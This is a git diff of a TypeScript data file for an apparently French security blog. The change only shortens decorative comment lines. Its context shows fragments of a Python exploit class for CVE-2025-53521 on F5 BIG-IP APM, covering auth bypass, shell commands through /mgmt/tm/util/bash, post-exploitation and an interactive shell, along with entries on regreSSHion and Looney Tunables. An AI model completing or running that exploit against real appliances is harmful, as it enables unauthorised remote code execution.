@@ -1,4 +1,4 @@
-// ─── Blog posts data ────────────────────────────────────────────────────────
+// ─ Blog posts data 
 // To add a post, push a new object to BLOG_POSTS.
 // Content uses a simple markdown-like syntax:
 //   ## Heading 2   ### Heading 3
@@ -29,10 +29,10 @@ export interface BlogPost {
   sourceUrl?: string      // Link to official advisory / challenge
 }
 
-// ─── POSTS ──────────────────────────────────────────────────────────────────
+// ─ POSTS 
 export const BLOG_POSTS: BlogPost[] = [
 
-  // ── CVE-2025-53521 — F5 BIG-IP APM ─────────────────────────────────────
+  //  CVE-2025-53521 — F5 BIG-IP APM ─
   {
     id: 'cve-2025-53521-f5-bigip-apm',
     title: 'CVE-2025-53521 — F5 BIG-IP APM : RCE non authentifié exploité activement',
@@ -241,7 +241,7 @@ class BigIPExploit:
         self.session.verify = False
         self.token   = None
 
-    # ── Phase 1 : Fingerprinting ─────────────────────────────────────────────
+    #  Phase 1 : Fingerprinting ─
     def fingerprint(self):
         print(f"[*] Probing {self.target} ...")
         try:
@@ -262,7 +262,7 @@ class BigIPExploit:
             print(f"[-] Fingerprint error: {e}")
         return None
 
-    # ── Phase 2 : Authentication bypass (CVE-2025-53521) ────────────────────
+    #  Phase 2 : Authentication bypass (CVE-2025-53521) 
     def bypass_auth(self):
         """
         The flaw is in the APM policy endpoint: a malformed authentication
@@ -294,7 +294,7 @@ class BigIPExploit:
             print(f"[-] Bypass error: {e}")
         return False
 
-    # ── Phase 3 : RCE via iControl REST ─────────────────────────────────────
+    #  Phase 3 : RCE via iControl REST ─
     def rce(self, cmd):
         """Execute shell command via /mgmt/tm/util/bash (requires token)."""
         if not self.token:
@@ -316,7 +316,7 @@ class BigIPExploit:
             print(f"[-] RCE error: {e}")
         return None
 
-    # ── Phase 4 : Post-exploitation ──────────────────────────────────────────
+    #  Phase 4 : Post-exploitation 
     def post_exploit(self):
         print("[*] Running post-exploitation commands ...")
         commands = {
@@ -333,7 +333,7 @@ class BigIPExploit:
                 print(f"\n  [{label}]")
                 print(f"  {out.strip()[:200]}")
 
-    # ── Interactive shell ────────────────────────────────────────────────────
+    #  Interactive shell 
     def interactive(self):
         print("\n[*] Interactive shell (type 'exit' to quit)\n")
         while True:
@@ -505,7 +505,7 @@ Se référer au bulletin F5 K000156741 pour la procédure de mise à jour compl�
 - Référence CVE : https://www.cve.org/CVERecord?id=CVE-2025-53521`,
   },
 
-  // ── CVE-2024-6387 — regreSSHion ─────────────────────────────────────────
+  //  CVE-2024-6387 — regreSSHion ─
   {
     id: 'cve-2024-6387-reggresshion',
     title: 'CVE-2024-6387 — regreSSHion : RCE non authentifié dans OpenSSH',
@@ -619,7 +619,7 @@ regreSSHion illustre parfaitement le danger des **régressions de sécurité** d
 - GitHub Advisory: https://github.com/advisories/GHSA-6fp7-3c57-5792`,
   },
 
-  // ── CVE-2023-4911 — Looney Tunables ─────────────────────────────────────
+  //  CVE-2023-4911 — Looney Tunables ─
   {
     id: 'cve-2023-4911-looney-tunables',
     title: 'CVE-2023-4911 — Looney Tunables : Privesc via Buffer Overflow dans glibc',
@@ -741,7 +741,7 @@ Looney Tunables est remarquable car elle affecte **le linker dynamique lui-même
 - Patch glibc: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1056e5b4c3f2d90ed2b4a55f96add28da2f4c8fa`,
   },
 
-  // ── CTF placeholder ──────────────────────────────────────────────────────
+  //  CTF placeholder 
   {
     id: 'ctf-template-001',
     title: 'Write-Up CTF — À venir',
@@ -793,7 +793,7 @@ Contenu à venir.`,
   },
 
 ]
-// ────────────────────────────────────────────────────────────────────────────
+// 
 
 export const ALL_CATEGORIES: PostCategory[] = ['CVE', 'CTF', 'Tools', 'Notes', 'Writeup']
 
